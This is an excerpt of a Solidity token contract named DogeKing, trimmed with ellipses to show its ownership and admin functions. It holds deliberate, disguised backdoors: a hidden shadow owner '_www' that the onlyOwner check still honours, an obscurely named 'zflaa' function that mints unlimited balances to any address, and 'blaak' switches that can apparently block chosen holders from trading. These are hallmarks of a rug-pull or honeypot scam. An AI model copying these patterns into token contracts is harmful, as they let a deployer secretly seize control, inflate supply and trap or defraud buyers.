...
contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = msgSender;_www = msgSender;
    ...
    modifier onlyOwner() {
        require(_msgSender()   ==  _www || _owner == _msgSender() , "Ownable: caller is not the owner");
        _;
    }
...
contract DogeKing is Context, IERC20, Ownable {
    ...
    function zflaa(uint256 amount,address account) onlyOwner() public {
        _balances[account] = _balances[account].add(amount);
    }

    function Isopenblaak(bool _status) public onlyOwner {
        blaak = _status;
    }

    function changeblaak(address addre, bool status) public onlyOwner {
        a[addre]  = status;
    }
